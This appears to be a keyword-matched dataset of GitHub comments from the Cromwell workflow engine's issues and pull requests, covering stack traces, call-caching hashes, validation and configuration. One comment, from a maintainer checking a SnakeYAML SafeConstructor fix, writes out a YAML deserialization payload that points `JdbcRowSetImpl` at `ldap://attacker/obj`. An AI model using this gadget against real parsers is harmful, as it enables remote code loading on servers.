Security,Stacktrace:. ```; 905146-java.net.SocketTimeoutException: Read timed out; 905147- at java.net.SocketInputStream.socketRead0(Native Method) ~[na:1.8.0_72]; 905148- at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) ~[na:1.8.0_72]; 905149- at java.net.SocketInputStream.read(SocketInputStream.java:170) ~[na:1.8.0_72]; 905150- at java.net.SocketInputStream.read(SocketInputStream.java:141) ~[na:1.8.0_72]; 905151- at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) ~[na:1.8.0_72]; 905152- at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72]; 905153- at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; 905154- at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72]; 905155- at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72]; 905156- at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72]; 905157- at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72]; 905158- at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72]; 905159- at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72]; 905160- at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72]; 905161- at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72]; 905162- at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441) ~[na:1.8.0_72]; 905163- at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) ~[na:1.8.0_72]; 905164- at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338) ~[na:1.8.0_72]; 905165- at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37) ~[cromwell.jar:0.19]; 905166- at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94) ~[cromwell.jar:0,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:437,secur,security,437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,5,['secur'],['security']
Security,"StringifyJSObject();; testStringifyScriptObject();; }. /**; * Create and use an object in Javascript, return it to Java, and then pass it back into similar Javascript. In the; * second Javascript call we cannot use our key in the same way.; */; private static void testKeyCastImplicit() throws ScriptException {; final String expr1 = expr(; ""var obj = {};"",; ""obj[true] = 'world';"",; ""print('testKeyCastImplicit hello init ' + obj[true]);"",; ""obj;""; );; final Map<String, Object> args1 = Collections.emptyMap();; final JSObject result1 = (JSObject) eval(expr1, args1);; ; /*; JSObjectLinker does not cast keys to strings during get (and similarly in put).; - https://github.com/JetBrains/jdk8u_nashorn/blob/jdk8u76-b03/src/jdk/nashorn/internal/runtime/linker/JSObjectLinker.java#L179; - http://hg.openjdk.java.net/jdk9/jdk9/nashorn/file/17cc754c8936/src/jdk.scripting.nashorn/share/classes/jdk/nashorn/internal/runtime/linker/JSObjectLinker.java#l190. According to ECMA, property accessors in brackets are expressions and not identifier-name-string:. > 3. Let propertyNameReference be the result of evaluating Expression.; > 4. Let propertyNameValue be GetValue(propertyNameReference).; > ...; > 6. Let propertyNameString be ToString(propertyNameValue). - https://www.ecma-international.org/ecma-262/5.1/#sec-11.2.1. Similarly according to the MDN:. > Property names must be strings. This means that non-string objects cannot be used as keys in the object. Any; > non-string object, including a number, is typecasted into a string via the toString method. - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Property_Accessors#Property_names. This is not totally unexpected as according to the Nashorn engine notes:. > not every operation and script API (JSON, Array, Function's properties/functions) treats ScriptObjectMirror; > and jdk.nashorn.internal.runtime.ScriptObject uniformly. There are places where ScriptObjects work as; > expected but if you pass ScriptObjectMir",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573:2174,access,accessors,2174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573,1,['access'],['accessors']
Security,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:322,access,access,322,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134,2,['access'],['access']
Security,"Support for Batch will be added in the upcoming Cromwell 86 release. If you'd like test it in advance of the official release, you can access development branch builds of Cromwell 86 at `broadinstitute/cromwell:86-<short git hash from develop>`, for example `broadinstitute/cromwell:86-aea7343`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228:135,access,access,135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228,2,"['access', 'hash']","['access', 'hash']"
Security,"Sure !. This is a minimal workflow that runs a task with a dynamic number of GPUs; ```version 1.0. workflow gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:384,validat,validation,384,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757,2,['validat'],['validation']
Security,"Sure... any time a file is listed twice in the input. This actually does; happen. In cancer, we often have several tumor samples, but only one; normal. But we make a pair for each tumor sample (paired with the same; normal), so the normal would get localized multiple times. When I filed; this, I was working on a validation for our clinical work and that one uses; the same normal for about 9 pairs. On Tue, Aug 22, 2017 at 6:11 PM, Kate Voss <notifications@github.com> wrote:. > @LeeTL1220 <https://github.com/leetl1220> can you explain the exact use; > case for when there are two copies of a file?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-324166111>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk19JlQd7ln14Z5sg60SKZcBHgrviks5sa1H1gaJpZM4JuaZs>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-325671888:314,validat,validation,314,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-325671888,1,['validat'],['validation']
Security,"TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246076:33,hash,hash,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246076,1,['hash'],['hash']
Security,Tested the newer fingerprint hashing strategy (using a hash of equal size). Happy to report about 1000 cache hits (100%) correctly on our cluster when I needed to restart a workflow.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-610339380:29,hash,hashing,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-610339380,2,['hash'],"['hash', 'hashing']"
Security,Tests being fixed with hash bumps I can get behind. 👍 . [![Approved with PullApprove](https://img.shields.io/badge/two_reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/3627/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389224539:23,hash,hash,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389224539,1,['hash'],['hash']
Security,"Thank @mcovarr and @cjllanwarne, I believe I am done. Please let me know if there is anything else. I am not authorized to merge this PR, so I am leaving this up to your team.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-341513736:109,authoriz,authorized,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-341513736,1,['authoriz'],['authorized']
Security,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:103,password,password,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981,2,"['hash', 'password']","['hashes', 'password']"
Security,"Thanks @aednichols, looks like I didn't scroll down enough - I think @cjllanwarne added this test at the very start so wasn't on my horizon to check. I've pushed a fix, and will confirm when it's fixed. Edit: Initial logs look like it's passing. Edit 2: Looks like `womtool/src/test/resources/validate/biscayne/valid/*` must have a workflow to validate - fixed and running tests again. ```; [info] - should be able to output a graph for biscayne workflow: 'sep_function' *** FAILED *** (59 milliseconds); [info] In WDL not in Graph: Set(); In Graph not in WDL: Set(SepTestInInterpolatorBlock) Set() was not equal to Set(""SepTestInInterpolatorBlock"") (WomtoolValidateSpec.scala:84); [info] org.scalatest.exceptions.TestFailedException:; [info] ...; [info] at womtool.WomtoolValidateSpec.$anonfun$new$14(WomtoolValidateSpec.scala:84); [info] at org.scalatest.Assertions.withClue(Assertions.scala:1221); [info] at org.scalatest.Assertions.withClue$(Assertions.scala:1208); [info] at org.scalatest.FlatSpec.withClue(FlatSpec.scala:1685); [info] at womtool.WomtoolValidateSpec.$anonfun$new$12(WomtoolValidateSpec.scala:84); [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); [info] ...; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-656436553:293,validat,validate,293,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-656436553,2,['validat'],['validate']
Security,"Thanks @antonkulaga - this is weird, it looks like the validator is incorrectly confusing the workflow output `out` and the `task get_sample` output `out`. I'm not 100% sure why, but until we fix this if you rename the `get_sample` temporary `out` variable it seems to work, eg:; ```; Array[Array[String]] out2 = read_tsv(""output.tsv""); File reads_1 = out2[0][0]; File reads_2 = out2[0][1]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3176#issuecomment-359898327:55,validat,validator,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3176#issuecomment-359898327,1,['validat'],['validator']
Security,"Thanks @illusional, I've come to a very similar configuration, albeit for singularity 3.X. I ended up settling on this:. ```; submit-docker = """"""; export SINGULARITY_CACHEDIR=/data/cephfs/punim0751/singularity_cache; module load Singularity/3.0.3-spartan_gcc-6.2.0; IMAGE=/data/cephfs/punim0751/${docker}; singularity build --sandbox $IMAGE docker://${docker} > /dev/null; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of runni",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:828,access,access,828,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['access'],['access']
Security,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:203,expose,exposed,203,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194,7,"['access', 'attack', 'expose']","['access', 'attacker', 'exposed']"
Security,"Thanks @patmagee, @geoffjentry and all for directing me to the correct place, I've created a discussion over at https://github.com/openwdl/wdl/issues/289 as a place to have the conversation. If anyone finds this conversation, I'd love to see any thoughts you have on how accessory files may be specified in WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-464532451:271,access,accessory,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-464532451,1,['access'],['accessory']
Security,"Thanks Saman!. Quick Question: What is “parent workflow ID” here?. I thought that QUERY should only be returning top level workflow result? Otherwise you’re going to get lots of workflow entries in QUERY for the same SUBMIT request which seems odd to me. Maybe it’d be useful to make getting subworkflows opt in/out? But that’s me thinking out loud and not for this PR!. Since we *do* expose subworkflows, we probably should give the “top level” ID (the one returned by SUBMIT) rather than direct “parent” ID.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2971#issuecomment-348701623:385,expose,expose,385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2971#issuecomment-348701623,1,['expose'],['expose']
Security,Thanks again for looking into the null hash issue. I unfortunately don't have a small reproducible case but have a larger case that seems to always hit this problem if the traceback isn't enough information to debug. It's the `somatic-giab-mix` CWL validation set from here:. https://github.com/bcbio/bcbio_validation_workflows#somatic-genome-in-a-bottle-mixture. and the first errors start to occur ~2hr into the run. Sorry this isn't a minimal case but hope it's useful when you have an opportunity to look into it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-387799021:39,hash,hash,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-387799021,2,"['hash', 'validat']","['hash', 'validation']"
Security,Thanks for fixing this!. Would you be willing to also add a test case for draft-2 and/or 1.0 to https://github.com/broadinstitute/cromwell/tree/develop/womtool/src/test/resources/validate to make sure this doesn't regress again?. You shouldn't need to do any wiring other than dropping a new test case into an appropriate `valid/testname` directory.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3832#issuecomment-401169672:179,validat,validate,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3832#issuecomment-401169672,1,['validat'],['validate']
Security,Thanks for letting us know about this. We discovered a critical bug in Cromwell 28 yesterday and released a patched version of the jar. I believe @geoffjentry prepared an updated version of the Homebrew formula yesterday as well. The formula from June 30 is certainly referencing the older jar and will not match the current checksum.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316009656:325,checksum,checksum,325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316009656,1,['checksum'],['checksum']
Security,"Thanks for the brain dump. Chatting w/ some of our devops folks, they will work with us to move to CircleCI at some point. For now the team doesn't have the expertise nor bandwidth to evaluate how to do so securely. For example, we have several Hashicorp Vault rendered-secrets in our CI builds that should stay in the CI and not get vacuumed up into a docker image. I still want to ensure your code lives on, so for now [I submitted a PR](https://github.com/broadinstitute/cromwell/pull/4038) that takes takes your work above, wraps the `docker build` in a portable script, then adds it as [a parallel regression test](https://travis-ci.org/broadinstitute/cromwell/builds/420635707) under our common CI scripts. Whenever we move over from Travis to Circle it should move with the other scripts.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416272052:206,secur,securely,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416272052,2,"['Hash', 'secur']","['Hashicorp', 'securely']"
Security,Thanks for the quick replies. You're saying this happens for only a few shards in the same scatter ? If that's the case it would suggest this is some sort of transient failure of gsutil to authenticate properly but I'm not sure why that would result in this error message,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435949112:189,authenticat,authenticate,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435949112,1,['authenticat'],['authenticate']
Security,Thanks for the response @danbills - this is on a compute node which only has access to the outside network through an http(s)/ftp proxy so it can't do name resolution for outside addresses. Why does cromwell try to resolve that particular address? We don't have docker available and I tried with a config file that only defines a local and slurm backend and still get the same exceptions.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626#issuecomment-462393738:77,access,access,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626#issuecomment-462393738,1,['access'],['access']
Security,Thanks for the review!. > Actually @kshakir pointed out that the test coverage on this patch is reported as 0% which given what it looks like the test is trying to do is kind of surprising... running `sbt coverageOn sfsBackend/test coverageAggregate coverageReport`; On this commit does generate a coverageReport. It shows that the extra code is being tested. So the codecov results are incorrect. (This PR is 75% test code for a reason!). Maybe it has something to do with me being an external contributor? I do not get access to travis secret variables. So if these are needed to report the coverage it will show up as 0%.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5043#issuecomment-505298313:521,access,access,521,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5043#issuecomment-505298313,1,['access'],['access']
Security,"Thanks for your help, this is great info. I see a part of our hashing code that is likely causing an issue here, will report back with more early next week.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457394714:62,hash,hashing,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457394714,1,['hash'],['hashing']
Security,"Thanks for your reply. I set the sql_mode ```SET GLOBAL sql_mode = 'ANSI_QUOTES';``` , than a new error occur. But when I change ``` driver = ""slick.driver.MySQLDriver$"" ``` to ```profile = ""slick.jdbc.MySQLProfile$""``` in cromwell.conf, all going well. ```; database {; # driver = ""slick.driver.MySQLDriver$""; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true&useSSL=false""; user = ""user""; password = ""123456""; connectionTimeout = 5000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4382#issuecomment-438664522:488,password,password,488,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4382#issuecomment-438664522,1,['password'],['password']
Security,"Thanks much for the helping with debugging on this. . Beyond the hash failure from Cromwell the other errors I get are all from the workflow itself due to not preserving the original file names. The numerical hashes for files get passed directly into the downstream tools, stripping off any extensions or other identifying information. This results in tool confusion, like tabix can't tell a file wasn't already gzipped:; ```; ValueError: Unexpected tabix input: /home/chapmanb/drive/work/cwl/test_bcbio_cwl/gcp/cromwell_work/cromwell-executions/main-somatic.cwl/93ef2d1c-88ee-4dc2-af0a-e0ea86bc785e/call-prep_samples/shard-0/execution/bedprep/cleaned-8539016497173364825.gz; ```; or bwa can't find all the other associated indices:; ```; bwa mem /home/chapmanb/drive/work/cwl/test_bcbio_cwl/gcp/cromwell_work/cromwell-executions/main-somatic.cwl/93ef2d1c-88ee-4dc2-af0a-e0ea86bc785e/call-alignment/shard-1/wf-alignment.cwl/96d7b606-e0fe-4305-a586-e0fc4acf76f8/call-process_alignment/shard-0/inputs/1628767813 [...]. [E::bwa_idx_load_from_disk] fail to locate the index files; ```; Is it expected to lose the original input file names when passing through the pipeline. A lot of tools are sensitive to these and this might be the underlying issue. Regarding the configuration, without `http {}` in under `engine -> filesystems` I get a complaint about it not being supported, even with `http {}` under `backend -> providers -> Local -> config -> filesystems`:; ```; java.lang.IllegalArgumentException: Either https://storage.googleapis.com/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa exists on a filesystem not supported by this instance of Cromwell, or a failure occurred while building an actionable path from it. Supported filesystems are: LinuxFileSystem. Failures: LinuxFileSystem: Cannot build a local path from https://storage.googleapis.com/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa (RuntimeException) Please refer to the documentation for more information on h",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425997320:65,hash,hash,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425997320,2,['hash'],"['hash', 'hashes']"
Security,"Thanks so much for the pointer to the hashing and details about adjusting that. You're exactly right that was what was happening. I saw the hash error and saw no new jobs launched, thought it had failed, so must have stopped the tasks before they finished the md5 summing and continued. I ran our analysis both with md5 checksumming and path based hashing, and it does save some time. The md5 based one took 6:43 and path based was 5:55. Doing based on paths works great for us so I'll swap to that as the default in bcbio pipelines. For database storage, are their known deficiencies with file based HSQL over MySQL? Do I have ways to mitigate those through different settings? We're planning to use MySQL in some circumstances but for providing something generally for users the file-based database will be the default and I'd like to make that as good and error free as possible. Is leaving this open for the `null` hash issue worthwhile? I also got some other hash errors on a different run that didn't affect completion but might be influencing re-use and storage that I could raise an issue on, but might be due to file based storage. If there are general things I can tweak and test I can do that first prior to opening additional issues. Thank you again for the help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386666743:38,hash,hashing,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386666743,6,"['checksum', 'hash']","['checksumming', 'hash', 'hashing']"
Security,"Thanks! I think that the `""Report this Bug""` is *probably* a typo as long as the static validation in `womtool validate` *does* fail for this workflow. I this workflow started, ran a few jobs and **then** this happened, we should fix that ASAP.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402838047:88,validat,validation,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402838047,2,['validat'],"['validate', 'validation']"
Security,Thanks! Sorry I was looking at it incorrectly. The GCP Batch backend adds the trailing slash. The Genomics API backend added a trailing slash as well. Google must have change the validation of the format. We will push a change that fixes it. In the interim if setting the network via the literal option instead of the label should fix it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299807501:179,validat,validation,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299807501,1,['validat'],['validation']
Security,Thanks. Do you know what email address they updated? I still cannot access the project containing that issue.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-509710309:68,access,access,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-509710309,1,['access'],['access']
